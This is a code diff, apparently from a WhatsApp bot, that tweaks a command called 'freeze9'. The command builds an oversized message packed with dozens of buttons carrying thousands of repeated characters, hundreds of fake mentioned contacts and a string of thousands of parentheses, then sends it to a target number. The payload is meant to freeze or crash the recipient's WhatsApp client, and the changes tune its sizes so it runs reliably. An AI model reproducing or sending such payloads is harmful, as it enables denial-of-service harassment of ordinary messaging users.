@@ -14775,16 +14775,16 @@ case "freeze9": {
             }
         ];
 
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 45; i++) {  // leicht reduziert für Stabilität
             ButtonsQPay.push(
                 { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
                 { 
                     name: "cta_copy", 
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(3000) }) 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2800) }) 
                 },
                 { 
                     name: "quick_reply", 
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(3000) }) 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2800) }) 
                 }
             );
         }
@@ -14810,7 +14810,7 @@ case "freeze9": {
                                 participant: target,
                                 mentionedJid: [
                                     "0@s.whatsapp.net",
-                                    ...Array.from({ length: 800 }, () => 
+                                    ...Array.from({ length: 700 }, () => 
                                         "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                     )
                                 ],
@@ -14819,17 +14819,19 @@ case "freeze9": {
                             },
                             nativeFlowMessage: {
                                 buttons: ButtonsQPay,
-                                messageParamsJson: "(".repeat(4000)
+                                messageParamsJson: "(".repeat(3500)
                             }
                         }
                     }
                 }
             },
-            { timestamp: Date.now() }   // <-- wichtig
+            { 
+                timestamp: new Date()   // ← WICHTIG: new Date() statt Date.now()
+            }
         );
 
         await sock.sendMessage(target, messageContent);
-        console.log(`✅ Freeze9 gesendet → ${target}`);
+        console.log(`✅ Freeze9 gesendet an ${target}`);
 
     } catch (e) {
         console.error("❌ Freeze9 Error:", e.message || e);
